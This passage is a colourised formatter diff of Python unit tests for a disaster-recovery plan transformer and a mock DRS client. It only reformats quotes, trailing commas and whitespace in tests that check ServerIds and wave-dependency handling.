\"WaveId\": \"wave-0\",\u001b[0m\n\u001b[32m+                    \"WaveName\": \"Wave 1\",\u001b[0m\n\u001b[32m+                    \"ServerIds\": \"s-123\",  # STRING instead of list - bug scenario\u001b[0m\n\u001b[32m+                    \"ProtectionGroupId\": \"pg-789\",\u001b[0m\n\u001b[32m+                    \"ExecutionType\": \"sequential\",\u001b[0m\n\u001b[32m+                    \"Dependencies\": [],\u001b[0m\n\u001b[32m+                }\u001b[0m\n\u001b[32m+            ],\u001b[0m\n\u001b[32m+            \"CreatedDate\": 1700000000,\u001b[0m\n\u001b[32m+            \"LastModifiedDate\": 1700000000,\u001b[0m\n\u001b[32m+        }\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        result = transform_rp_to_camelcase(rp)\u001b[0m\n\u001b[32m+\u001b[0m\n         # Should recover by wrapping string in list\n\u001b[31m-        assert isinstance(result['waves'][0]['serverIds'], list)\u001b[0m\n\u001b[31m-        assert result['waves'][0]['serverIds'] == ['s-123']\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+        assert isinstance(result[\"waves\"][0][\"serverIds\"], list)\u001b[0m\n\u001b[32m+        assert result[\"waves\"][0][\"serverIds\"] == [\"s-123\"]\u001b[0m\n\u001b[32m+\u001b[0m\n     def test_transform_with_missing_server_ids(self):\n         \"\"\"Test handling of missing ServerIds field\"\"\"\n         rp = {\n\u001b[31m-            'PlanId': 'plan-789',\u001b[0m\n\u001b[31m-            'PlanName': 'Empty Wave Plan',\u001b[0m\n\u001b[31m-            'Description': 'Test',\u001b[0m\n\u001b[31m-            'AccountId': '123456789012',\u001b[0m\n\u001b[31m-            'Region': 'us-east-1',\u001b[0m\n\u001b[31m-            'Owner': 'testuser',\u001b[0m\n\u001b[31m-            'RPO': 60,\u001b[0m\n\u001b[31m-            'RTO': 120,\u001b[0m\n\u001b[31m-            'Waves': [{\u001b[0m\n\u001b[31m-                'WaveId': 'wave-0',\u001b[0m\n\u001b[31m-                'WaveName': 'Wave 1',\u001b[0m\n\u001b[31m-                # ServerIds missing entirely\u001b[0m\n\u001b[31m-                'ProtectionGroupId': 'pg-789',\u001b[0m\n\u001b[31m-                'ExecutionType': 'sequential',\u001b[0m\n\u001b[31m-                'Dependencies': []\u001b[0m\n\u001b[31m-            }],\u001b[0m\n\u001b[31m-            'CreatedDate': 1700000000,\u001b[0m\n\u001b[31m-            'LastModifiedDate': 1700000000\u001b[0m\n\u001b[31m-        }\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        result = transform_rp_to_camelcase(rp)\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+            \"PlanId\": \"plan-789\",\u001b[0m\n\u001b[32m+            \"PlanName\": \"Empty Wave Plan\",\u001b[0m\n\u001b[32m+            \"Description\": \"Test\",\u001b[0m\n\u001b[32m+            \"AccountId\": \"123456789012\",\u001b[0m\n\u001b[32m+            \"Region\": \"us-east-1\",\u001b[0m\n\u001b[32m+            \"Owner\": \"testuser\",\u001b[0m\n\u001b[32m+            \"RPO\": 60,\u001b[0m\n\u001b[32m+            \"RTO\": 120,\u001b[0m\n\u001b[32m+            \"Waves\": [\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"WaveId\": \"wave-0\",\u001b[0m\n\u001b[32m+                    \"WaveName\": \"Wave 1\",\u001b[0m\n\u001b[32m+                    # ServerIds missing entirely\u001b[0m\n\u001b[32m+                    \"ProtectionGroupId\": \"pg-789\",\u001b[0m\n\u001b[32m+                    \"ExecutionType\": \"sequential\",\u001b[0m\n\u001b[32m+                    \"Dependencies\": [],\u001b[0m\n\u001b[32m+                }\u001b[0m\n\u001b[32m+            ],\u001b[0m\n\u001b[32m+            \"CreatedDate\": 1700000000,\u001b[0m\n\u001b[32m+            \"LastModifiedDate\": 1700000000,\u001b[0m\n\u001b[32m+        }\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        result = transform_rp_to_camelcase(rp)\u001b[0m\n\u001b[32m+\u001b[0m\n         # Should default to empty list\n\u001b[31m-        assert result['waves'][0]['serverIds'] == []\u001b[0m\n\u001b[31m-        assert isinstance(result['waves'][0]['serverIds'], list)\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+        assert result[\"waves\"][0][\"serverIds\"] == []\u001b[0m\n\u001b[32m+        assert isinstance(result[\"waves\"][0][\"serverIds\"], list)\u001b[0m\n\u001b[32m+\u001b[0m\n     def test_transform_with_invalid_server_ids_type(self):\n         \"\"\"Test handling of invalid ServerIds type (number, dict, etc.)\"\"\"\n         rp = {\n\u001b[31m-            'PlanId': 'plan-999',\u001b[0m\n\u001b[31m-            'PlanName': 'Invalid Type Plan',\u001b[0m\n\u001b[31m-            'Description': 'Test',\u001b[0m\n\u001b[31m-            'AccountId': '123456789012',\u001b[0m\n\u001b[31m-            'Region': 'us-east-1',\u001b[0m\n\u001b[31m-            'Owner': 'testuser',\u001b[0m\n\u001b[31m-            'RPO': 60,\u001b[0m\n\u001b[31m-            'RTO': 120,\u001b[0m\n\u001b[31m-            'Waves': [{\u001b[0m\n\u001b[31m-                'WaveId': 'wave-0',\u001b[0m\n\u001b[31m-                'WaveName': 'Wave 1',\u001b[0m\n\u001b[31m-                'ServerIds': {'invalid': 'dict'},  # Invalid type\u001b[0m\n\u001b[31m-                'ProtectionGroupId': 'pg-789',\u001b[0m\n\u001b[31m-                'ExecutionType': 'sequential',\u001b[0m\n\u001b[31m-                'Dependencies': []\u001b[0m\n\u001b[31m-            }],\u001b[0m\n\u001b[31m-            'CreatedDate': 1700000000,\u001b[0m\n\u001b[31m-            'LastModifiedDate': 1700000000\u001b[0m\n\u001b[31m-        }\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        result = transform_rp_to_camelcase(rp)\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+            \"PlanId\": \"plan-999\",\u001b[0m\n\u001b[32m+            \"PlanName\": \"Invalid Type Plan\",\u001b[0m\n\u001b[32m+            \"Description\": \"Test\",\u001b[0m\n\u001b[32m+            \"AccountId\": \"123456789012\",\u001b[0m\n\u001b[32m+            \"Region\": \"us-east-1\",\u001b[0m\n\u001b[32m+            \"Owner\": \"testuser\",\u001b[0m\n\u001b[32m+            \"RPO\": 60,\u001b[0m\n\u001b[32m+            \"RTO\": 120,\u001b[0m\n\u001b[32m+            \"Waves\": [\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"WaveId\": \"wave-0\",\u001b[0m\n\u001b[32m+                    \"WaveName\": \"Wave 1\",\u001b[0m\n\u001b[32m+                    \"ServerIds\": {\"invalid\": \"dict\"},  # Invalid type\u001b[0m\n\u001b[32m+                    \"ProtectionGroupId\": \"pg-789\",\u001b[0m\n\u001b[32m+                    \"ExecutionType\": \"sequential\",\u001b[0m\n\u001b[32m+                    \"Dependencies\": [],\u001b[0m\n\u001b[32m+                }\u001b[0m\n\u001b[32m+            ],\u001b[0m\n\u001b[32m+            \"CreatedDate\": 1700000000,\u001b[0m\n\u001b[32m+            \"LastModifiedDate\": 1700000000,\u001b[0m\n\u001b[32m+        }\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        result = transform_rp_to_camelcase(rp)\u001b[0m\n\u001b[32m+\u001b[0m\n         # Should recover with empty list\n\u001b[31m-        assert result['waves'][0]['serverIds'] == []\u001b[0m\n\u001b[31m-        assert isinstance(result['waves'][0]['serverIds'], list)\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+        assert result[\"waves\"][0][\"serverIds\"] == []\u001b[0m\n\u001b[32m+        assert isinstance(result[\"waves\"][0][\"serverIds\"], list)\u001b[0m\n\u001b[32m+\u001b[0m\n     def test_transform_with_empty_waves(self):\n         \"\"\"Test handling of empty Waves array\"\"\"\n         rp = {\n\u001b[31m-            'PlanId': 'plan-empty',\u001b[0m\n\u001b[31m-            'PlanName': 'No Waves Plan',\u001b[0m\n\u001b[31m-            'Description': 'Test',\u001b[0m\n\u001b[31m-            'AccountId': '123456789012',\u001b[0m\n\u001b[31m-            'Region': 'us-east-1',\u001b[0m\n\u001b[31m-            'Owner': 'testuser',\u001b[0m\n\u001b[31m-            'RPO': 60,\u001b[0m\n\u001b[31m-            'RTO': 120,\u001b[0m\n\u001b[31m-            'Waves': [],  # No waves\u001b[0m\n\u001b[31m-            'CreatedDate': 1700000000,\u001b[0m\n\u001b[31m-            'LastModifiedDate': 1700000000\u001b[0m\n\u001b[31m-        }\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        result = transform_rp_to_camelcase(rp)\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        assert result['waves'] == []\u001b[0m\n\u001b[31m-        assert result['waveCount'] == 0\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+            \"PlanId\": \"plan-empty\",\u001b[0m\n\u001b[32m+            \"PlanName\": \"No Waves Plan\",\u001b[0m\n\u001b[32m+            \"Description\": \"Test\",\u001b[0m\n\u001b[32m+            \"AccountId\": \"123456789012\",\u001b[0m\n\u001b[32m+            \"Region\": \"us-east-1\",\u001b[0m\n\u001b[32m+            \"Owner\": \"testuser\",\u001b[0m\n\u001b[32m+            \"RPO\": 60,\u001b[0m\n\u001b[32m+            \"RTO\": 120,\u001b[0m\n\u001b[32m+            \"Waves\": [],  # No waves\u001b[0m\n\u001b[32m+            \"CreatedDate\": 1700000000,\u001b[0m\n\u001b[32m+            \"LastModifiedDate\": 1700000000,\u001b[0m\n\u001b[32m+        }\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        result = transform_rp_to_camelcase(rp)\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        assert result[\"waves\"] == []\u001b[0m\n\u001b[32m+        assert result[\"waveCount\"] == 0\u001b[0m\n\u001b[32m+\u001b[0m\n     def test_transform_with_dependencies(self):\n         \"\"\"Test extraction of dependency wave numbers from WaveId format\"\"\"\n         rp = {\n\u001b[31m-            'PlanId': 'plan-deps',\u001b[0m\n\u001b[31m-            'PlanName': 'Dependencies Plan',\u001b[0m\n\u001b[31m-            'Description': 'Test',\u001b[0m\n\u001b[31m-            'AccountId': '123456789012',\u001b[0m\n\u001b[31m-            'Region': 'us-east-1',\u001b[0m\n\u001b[31m-            'Owner': 'testuser',\u001b[0m\n\u001b[31m-            'RPO': 60,\u001b[0m\n\u001b[31m-            'RTO': 120,\u001b[0m\n\u001b[31m-            'Waves': [\u001b[0m\n\u001b[31m-                {\u001b[0m\n\u001b[31m-                    'WaveId': 'wave-0',\u001b[0m\n\u001b[31m-                    'WaveName': 'Wave 1',\u001b[0m\n\u001b[31m-                    'ServerIds': ['s-123'],\u001b[0m\n\u001b[31m-                    'ProtectionGroupId': 'pg-789',\u001b[0m\n\u001b[31m-                    'ExecutionType': 'sequential',\u001b[0m\n\u001b[31m-                    'Dependencies': []\u001b[0m\n\u001b[31m-                },\u001b[0m\n\u001b[31m-                {\u001b[0m\n\u001b[31m-                    'WaveId': 'wave-1',\u001b[0m\n\u001b[31m-                    'WaveName': 'Wave 2',\u001b[0m\n\u001b[31m-                    'ServerIds': ['s-456'],\u001b[0m\n\u001b[31m-                    'ProtectionGroupId': 'pg-789',\u001b[0m\n\u001b[31m-                    'ExecutionType': 'sequential',\u001b[0m\n\u001b[31m-                    'Dependencies': [\u001b[0m\n\u001b[31m-                        {'DependsOnWaveId': 'wave-0'}\u001b[0m\n\u001b[31m-                    ]\u001b[0m\n\u001b[31m-                },\u001b[0m\n\u001b[31m-                {\u001b[0m\n\u001b[31m-                    'WaveId': 'wave-2',\u001b[0m\n\u001b[31m-                    'WaveName': 'Wave 3',\u001b[0m\n\u001b[31m-                    'ServerIds': ['s-789'],\u001b[0m\n\u001b[31m-                    'ProtectionGroupId': 'pg-789',\u001b[0m\n\u001b[31m-                    'ExecutionType': 'sequential',\u001b[0m\n\u001b[31m-                    'Dependencies': [\u001b[0m\n\u001b[31m-                        {'DependsOnWaveId': 'wave-0'},\u001b[0m\n\u001b[31m-                        {'DependsOnWaveId': 'wave-1'}\u001b[0m\n\u001b[31m-                    ]\u001b[0m\n\u001b[31m-                }\u001b[0m\n\u001b[31m-            ],\u001b[0m\n\u001b[31m-            'CreatedDate': 1700000000,\u001b[0m\n\u001b[31m-            'LastModifiedDate': 1700000000\u001b[0m\n\u001b[31m-        }\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        result = transform_rp_to_camelcase(rp)\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+            \"PlanId\": \"plan-deps\",\u001b[0m\n\u001b[32m+            \"PlanName\": \"Dependencies Plan\",\u001b[0m\n\u001b[32m+            \"Description\": \"Test\",\u001b[0m\n\u001b[32m+            \"AccountId\": \"123456789012\",\u001b[0m\n\u001b[32m+            \"Region\": \"us-east-1\",\u001b[0m\n\u001b[32m+            \"Owner\": \"testuser\",\u001b[0m\n\u001b[32m+            \"RPO\": 60,\u001b[0m\n\u001b[32m+            \"RTO\": 120,\u001b[0m\n\u001b[32m+            \"Waves\": [\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"WaveId\": \"wave-0\",\u001b[0m\n\u001b[32m+                    \"WaveName\": \"Wave 1\",\u001b[0m\n\u001b[32m+                    \"ServerIds\": [\"s-123\"],\u001b[0m\n\u001b[32m+                    \"ProtectionGroupId\": \"pg-789\",\u001b[0m\n\u001b[32m+                    \"ExecutionType\": \"sequential\",\u001b[0m\n\u001b[32m+                    \"Dependencies\": [],\u001b[0m\n\u001b[32m+                },\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"WaveId\": \"wave-1\",\u001b[0m\n\u001b[32m+                    \"WaveName\": \"Wave 2\",\u001b[0m\n\u001b[32m+                    \"ServerIds\": [\"s-456\"],\u001b[0m\n\u001b[32m+                    \"ProtectionGroupId\": \"pg-789\",\u001b[0m\n\u001b[32m+                    \"ExecutionType\": \"sequential\",\u001b[0m\n\u001b[32m+                    \"Dependencies\": [{\"DependsOnWaveId\": \"wave-0\"}],\u001b[0m\n\u001b[32m+                },\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"WaveId\": \"wave-2\",\u001b[0m\n\u001b[32m+                    \"WaveName\": \"Wave 3\",\u001b[0m\n\u001b[32m+                    \"ServerIds\": [\"s-789\"],\u001b[0m\n\u001b[32m+                    \"ProtectionGroupId\": \"pg-789\",\u001b[0m\n\u001b[32m+                    \"ExecutionType\": \"sequential\",\u001b[0m\n\u001b[32m+                    \"Dependencies\": [\u001b[0m\n\u001b[32m+                        {\"DependsOnWaveId\": \"wave-0\"},\u001b[0m\n\u001b[32m+                        {\"DependsOnWaveId\": \"wave-1\"},\u001b[0m\n\u001b[32m+                    ],\u001b[0m\n\u001b[32m+                },\u001b[0m\n\u001b[32m+            ],\u001b[0m\n\u001b[32m+            \"CreatedDate\": 1700000000,\u001b[0m\n\u001b[32m+            \"LastModifiedDate\": 1700000000,\u001b[0m\n\u001b[32m+        }\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        result = transform_rp_to_camelcase(rp)\u001b[0m\n\u001b[32m+\u001b[0m\n         # Wave 0: no dependencies\n\u001b[31m-        assert result['waves'][0]['dependsOnWaves'] == []\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        assert result[\"waves\"][0][\"dependsOnWaves\"] == []\u001b[0m\n\u001b[32m+\u001b[0m\n         # Wave 1: depends on wave 0\n\u001b[31m-        assert result['waves'][1]['dependsOnWaves'] == [0]\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        assert result[\"waves\"][1][\"dependsOnWaves\"] == [0]\u001b[0m\n\u001b[32m+\u001b[0m\n         # Wave 2: depends on waves 0 and 1\n\u001b[31m-        assert result['waves'][2]['dependsOnWaves'] == [0, 1]\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+        assert result[\"waves\"][2][\"dependsOnWaves\"] == [0, 1]\u001b[0m\n\u001b[32m+\u001b[0m\n     def test_transform_with_malformed_dependencies(self):\n         \"\"\"Test handling of malformed dependency WaveIds\"\"\"\n         rp = {\n\u001b[31m-            'PlanId': 'plan-bad-deps',\u001b[0m\n\u001b[31m-            'PlanName': 'Bad Dependencies Plan',\u001b[0m\n\u001b[31m-            'Description': 'Test',\u001b[0m\n\u001b[31m-            'AccountId': '123456789012',\u001b[0m\n\u001b[31m-            'Region': 'us-east-1',\u001b[0m\n\u001b[31m-            'Owner': 'testuser',\u001b[0m\n\u001b[31m-            'RPO': 60,\u001b[0m\n\u001b[31m-            'RTO': 120,\u001b[0m\n\u001b[31m-            'Waves': [{\u001b[0m\n\u001b[31m-                'WaveId': 'wave-0',\u001b[0m\n\u001b[31m-                'WaveName': 'Wave 1',\u001b[0m\n\u001b[31m-                'ServerIds': ['s-123'],\u001b[0m\n\u001b[31m-                'ProtectionGroupId': 'pg-789',\u001b[0m\n\u001b[31m-                'ExecutionType': 'sequential',\u001b[0m\n\u001b[31m-                'Dependencies': [\u001b[0m\n\u001b[31m-                    {'DependsOnWaveId': 'invalid-format'},  # No hyphen-number\u001b[0m\n\u001b[31m-                    {'DependsOnWaveId': 'wave-abc'},  # Non-numeric\u001b[0m\n\u001b[31m-                    {'DependsOnWaveId': ''},  # Empty\u001b[0m\n\u001b[31m-                ]\u001b[0m\n\u001b[31m-            }],\u001b[0m\n\u001b[31m-            'CreatedDate': 1700000000,\u001b[0m\n\u001b[31m-            'LastModifiedDate': 1700000000\u001b[0m\n\u001b[31m-        }\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        result = transform_rp_to_camelcase(rp)\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+            \"PlanId\": \"plan-bad-deps\",\u001b[0m\n\u001b[32m+            \"PlanName\": \"Bad Dependencies Plan\",\u001b[0m\n\u001b[32m+            \"Description\": \"Test\",\u001b[0m\n\u001b[32m+            \"AccountId\": \"123456789012\",\u001b[0m\n\u001b[32m+            \"Region\": \"us-east-1\",\u001b[0m\n\u001b[32m+            \"Owner\": \"testuser\",\u001b[0m\n\u001b[32m+            \"RPO\": 60,\u001b[0m\n\u001b[32m+            \"RTO\": 120,\u001b[0m\n\u001b[32m+            \"Waves\": [\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"WaveId\": \"wave-0\",\u001b[0m\n\u001b[32m+                    \"WaveName\": \"Wave 1\",\u001b[0m\n\u001b[32m+                    \"ServerIds\": [\"s-123\"],\u001b[0m\n\u001b[32m+                    \"ProtectionGroupId\": \"pg-789\",\u001b[0m\n\u001b[32m+                    \"ExecutionType\": \"sequential\",\u001b[0m\n\u001b[32m+                    \"Dependencies\": [\u001b[0m\n\u001b[32m+                        {\u001b[0m\n\u001b[32m+                            \"DependsOnWaveId\": \"invalid-format\"\u001b[0m\n\u001b[32m+                        },  # No hyphen-number\u001b[0m\n\u001b[32m+                        {\"DependsOnWaveId\": \"wave-abc\"},  # Non-numeric\u001b[0m\n\u001b[32m+                        {\"DependsOnWaveId\": \"\"},  # Empty\u001b[0m\n\u001b[32m+                    ],\u001b[0m\n\u001b[32m+                }\u001b[0m\n\u001b[32m+            ],\u001b[0m\n\u001b[32m+            \"CreatedDate\": 1700000000,\u001b[0m\n\u001b[32m+            \"LastModifiedDate\": 1700000000,\u001b[0m\n\u001b[32m+        }\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        result = transform_rp_to_camelcase(rp)\u001b[0m\n\u001b[32m+\u001b[0m\n         # Should skip malformed dependencies gracefully\n\u001b[31m-        assert result['waves'][0]['dependsOnWaves'] == []\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+        assert result[\"waves\"][0][\"dependsOnWaves\"] == []\u001b[0m\n\u001b[32m+\u001b[0m\n     def test_transform_multiple_waves_with_various_server_id_formats(self):\n         \"\"\"Test transformation with mixed ServerIds formats across waves\"\"\"\n         rp = {\n\u001b[31m-            'PlanId': 'plan-mixed',\u001b[0m\n\u001b[31m-            'PlanName': 'Mixed Format Plan',\u001b[0m\n\u001b[31m-            'Description': 'Test',\u001b[0m\n\u001b[31m-            'AccountId': '123456789012',\u001b[0m\n\u001b[31m-            'Region': 'us-east-1',\u001b[0m\n\u001b[31m-            'Owner': 'testuser',\u001b[0m\n\u001b[31m-            'RPO': 60,\u001b[0m\n\u001b[31m-            'RTO': 120,\u001b[0m\n\u001b[31m-            'Waves': [\u001b[0m\n\u001b[31m-                {\u001b[0m\n\u001b[31m-                    'WaveId': 'wave-0',\u001b[0m\n\u001b[31m-                    'WaveName': 'Correct Wave',\u001b[0m\n\u001b[31m-                    'ServerIds': ['s-111', 's-222'],  # Correct list\u001b[0m\n\u001b[31m-                    'ProtectionGroupId': 'pg-789',\u001b[0m\n\u001b[31m-                    'ExecutionType': 'sequential',\u001b[0m\n\u001b[31m-                    'Dependencies': []\u001b[0m\n\u001b[31m-                },\u001b[0m\n\u001b[31m-                {\u001b[0m\n\u001b[31m-                    'WaveId': 'wave-1',\u001b[0m\n\u001b[31m-                    'WaveName': 'String Wave',\u001b[0m\n\u001b[31m-                    'ServerIds': 's-333',  # String (bug scenario)\u001b[0m\n\u001b[31m-                    'ProtectionGroupId': 'pg-789',\u001b[0m\n\u001b[31m-                    'ExecutionType': 'sequential',\u001b[0m\n\u001b[31m-                    'Dependencies': []\u001b[0m\n\u001b[31m-                },\u001b[0m\n\u001b[31m-                {\u001b[0m\n\u001b[31m-                    'WaveId': 'wave-2',\u001b[0m\n\u001b[31m-                    'WaveName': 'Missing Wave',\u001b[0m\n\u001b[32m+            \"PlanId\": \"plan-mixed\",\u001b[0m\n\u001b[32m+            \"PlanName\": \"Mixed Format Plan\",\u001b[0m\n\u001b[32m+            \"Description\": \"Test\",\u001b[0m\n\u001b[32m+            \"AccountId\": \"123456789012\",\u001b[0m\n\u001b[32m+            \"Region\": \"us-east-1\",\u001b[0m\n\u001b[32m+            \"Owner\": \"testuser\",\u001b[0m\n\u001b[32m+            \"RPO\": 60,\u001b[0m\n\u001b[32m+            \"RTO\": 120,\u001b[0m\n\u001b[32m+            \"Waves\": [\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"WaveId\": \"wave-0\",\u001b[0m\n\u001b[32m+                    \"WaveName\": \"Correct Wave\",\u001b[0m\n\u001b[32m+                    \"ServerIds\": [\"s-111\", \"s-222\"],  # Correct list\u001b[0m\n\u001b[32m+                    \"ProtectionGroupId\": \"pg-789\",\u001b[0m\n\u001b[32m+                    \"ExecutionType\": \"sequential\",\u001b[0m\n\u001b[32m+                    \"Dependencies\": [],\u001b[0m\n\u001b[32m+                },\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"WaveId\": \"wave-1\",\u001b[0m\n\u001b[32m+                    \"WaveName\": \"String Wave\",\u001b[0m\n\u001b[32m+                    \"ServerIds\": \"s-333\",  # String (bug scenario)\u001b[0m\n\u001b[32m+                    \"ProtectionGroupId\": \"pg-789\",\u001b[0m\n\u001b[32m+                    \"ExecutionType\": \"sequential\",\u001b[0m\n\u001b[32m+                    \"Dependencies\": [],\u001b[0m\n\u001b[32m+                },\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"WaveId\": \"wave-2\",\u001b[0m\n\u001b[32m+                    \"WaveName\": \"Missing Wave\",\u001b[0m\n                     # ServerIds missing\n\u001b[31m-                    'ProtectionGroupId': 'pg-789',\u001b[0m\n\u001b[31m-                    'ExecutionType': 'sequential',\u001b[0m\n\u001b[31m-                    'Dependencies': []\u001b[0m\n\u001b[31m-                }\u001b[0m\n\u001b[31m-            ],\u001b[0m\n\u001b[31m-            'CreatedDate': 1700000000,\u001b[0m\n\u001b[31m-            'LastModifiedDate': 1700000000\u001b[0m\n\u001b[31m-        }\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        result = transform_rp_to_camelcase(rp)\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+                    \"ProtectionGroupId\": \"pg-789\",\u001b[0m\n\u001b[32m+                    \"ExecutionType\": \"sequential\",\u001b[0m\n\u001b[32m+                    \"Dependencies\": [],\u001b[0m\n\u001b[32m+                },\u001b[0m\n\u001b[32m+            ],\u001b[0m\n\u001b[32m+            \"CreatedDate\": 1700000000,\u001b[0m\n\u001b[32m+            \"LastModifiedDate\": 1700000000,\u001b[0m\n\u001b[32m+        }\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        result = transform_rp_to_camelcase(rp)\u001b[0m\n\u001b[32m+\u001b[0m\n         # Wave 0: should have correct list\n\u001b[31m-        assert result['waves'][0]['serverIds'] == ['s-111', 's-222']\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        assert result[\"waves\"][0][\"serverIds\"] == [\"s-111\", \"s-222\"]\u001b[0m\n\u001b[32m+\u001b[0m\n         # Wave 1: should recover string to list\n\u001b[31m-        assert result['waves'][1]['serverIds'] == ['s-333']\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        assert result[\"waves\"][1][\"serverIds\"] == [\"s-333\"]\u001b[0m\n\u001b[32m+\u001b[0m\n         # Wave 2: should default to empty list\n\u001b[31m-        assert result['waves'][2]['serverIds'] == []\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        assert result[\"waves\"][2][\"serverIds\"] == []\u001b[0m\n\u001b[32m+\u001b[0m\n         # All should be lists\n\u001b[31m-        for wave in result['waves']:\u001b[0m\n\u001b[31m-            assert isinstance(wave['serverIds'], list)\u001b[0m\n\u001b[31m-\u001b[0m\n\u001b[31m-\u001b[0m\n\u001b[31m-if __name__ == '__main__':\u001b[0m\n\u001b[31m-    pytest.main([__file__, '-v'])\u001b[0m\n\u001b[32m+        for wave in result[\"waves\"]:\u001b[0m\n\u001b[32m+            assert isinstance(wave[\"serverIds\"], list)\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+if __name__ == \"__main__\":\u001b[0m\n\u001b[32m+    pytest.main([__file__, \"-v\"])\u001b[0m\n\u001b[1m--- tests/python/unit/test_mock_drs_client.py\t2025-11-19 23:07:00.671815+00:00\u001b[0m\n\u001b[1m+++ tests/python/unit/test_mock_drs_client.py\t2026-01-02 15:49:03.663894+00:00\u001b[0m\n\u001b[36m@@ -7,358 +7,411 @@\u001b[0m\n from mocks.mock_drs_client import (\n     MockDRSClient,\n     ThrottlingException,\n     ResourceNotFoundException,\n     ServiceUnavailableException,\n\u001b[31m-    create_mock_drs_client\u001b[0m\n\u001b[32m+    create_mock_drs_client,\u001b[0m\n )\n \n \n class TestMockDRSClient:\n     \"\"\"Test suite for MockDRSClient.\"\"\"\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_initialization(self):\n         \"\"\"Test mock client initializes with default test servers.\"\"\"\n         client = MockDRSClient()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         response = client.describe_source_servers()\n         assert len(response[\"items\"]) == 6\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Verify server ID format\n         for server in response[\"items\"]:\n             assert server[\"sourceServerID\"].startswith(\"s-\")\n             assert len(server[\"sourceServerID\"]) == 19\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_describe_source_servers_all(self):\n         \"\"\"Test describe_source_servers returns all servers.\"\"\"\n         client = MockDRSClient()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         response = client.describe_source_servers()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert \"items\" in response\n         assert len(response[\"items\"]) == 6\n         assert response[\"nextToken\"] is None\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_describe_source_servers_filtered(self):\n         \"\"\"Test describe_source_servers with filter.\"\"\"\n         client = MockDRSClient()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         server_ids = [\"s-3d75cdc0d9a28a725\", \"s-3afa164776f93ce4f\"]\n         response = client.describe_source_servers(\n             filters={\"sourceServerIDs\": server_ids}\n         )\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert len(response[\"items\"]) == 2\n         returned_ids = [s[\"sourceServerID\"] for s in response[\"items\"]]\n         assert set(returned_ids) == set(server_ids)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_describe_source_servers_nonexistent(self):\n         \"\"\"Test describe_source_servers with nonexistent server.\"\"\"\n         client = MockDRSClient()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         response = client.describe_source_servers(\n             filters={\"sourceServerIDs\": [\"s-nonexistent\"]}\n         )\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         assert len(response[\"items\"]) == 0\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_start_recovery_single_server(self):\n         \"\"\"Test start_recovery with single server.\"\"\"\n         client = MockDRSClient()\n\u001b[31m-        \u001b[0m\n\u001b[31m-        response = client.start_recovery(\u001b[0m\n\u001b[31m-            sourceServers=[\u001b[0m\n\u001b[31m-                {\"sourceServerID\": \"s-3d75cdc0d9a28a725\", \"recoverySnapshotID\": \"LATEST\"}\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        response = client.start_recovery(\u001b[0m\n\u001b[32m+            sourceServers=[\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"sourceServerID\": \"s-3d75cdc0d9a28a725\",\u001b[0m\n\u001b[32m+                    \"recoverySnapshotID\": 